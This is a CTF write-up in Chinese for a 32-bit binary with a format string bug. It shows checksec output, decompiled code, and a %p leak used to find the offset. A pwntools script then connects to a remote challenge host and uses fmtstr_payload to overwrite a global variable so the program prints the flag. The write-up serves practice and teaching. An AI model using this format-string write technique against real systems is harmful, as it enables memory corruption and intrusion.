# checksec

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found   //栈溢出保护
NX:       NX enabled     //堆栈不可执行
PIE:      No PIE (0x8048000)  //地址干扰未开启
```

# IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int buf; // [esp+1Eh] [ebp-7Eh]
  int v5; // [esp+22h] [ebp-7Ah]
  __int16 v6; // [esp+26h] [ebp-76h]
  char s; // [esp+28h] [ebp-74h]
  unsigned int v8; // [esp+8Ch] [ebp-10h]

  v8 = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  buf = 0;
  v5 = 0;
  v6 = 0;
  memset(&s, 0, 0x64u);
  puts("please tell me your name:");
  read(0, &buf, 0xAu);
  puts("leave your message please:");
  fgets(&s, 100, stdin);
  printf("hello %s", &buf);
  puts("your message is:");
  printf(&s);
  if ( pwnme == 8 ) 
  {
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
  }
  else
  {
    puts("Thank you!");
  }
  return 0;
}
```

分析程序需要修改pwnme的值为8。结合上面的 printf(&s)，存在字符串格式化漏洞。

pwnme的地址：0x0804A068

计算偏移量：

```
./aa
please tell me your name:
aaa
leave your message please:
aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
hello aaa
your message is:
aaaa-0xffcc31be-0xf7f5e580-0xffcc321c-0xf7faaae0-0x1-0xf7f77410-0x61610001-0xa61-(nil)-0x61616161-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025
Thank you!
```

可以看出偏移量为：10

Python脚本：

```python
from pwn import *

context.log_level = 'debug'

sh = remote('111.200.241.244', 59640)

pwnme = 0x0804A068

sh.recv()

sh.sendline(b'aaaa')

sh.recv()

payload = fmtstr_payload(10, {pwnme: 8})

sh.sendline(payload)

sh.interactive()

```



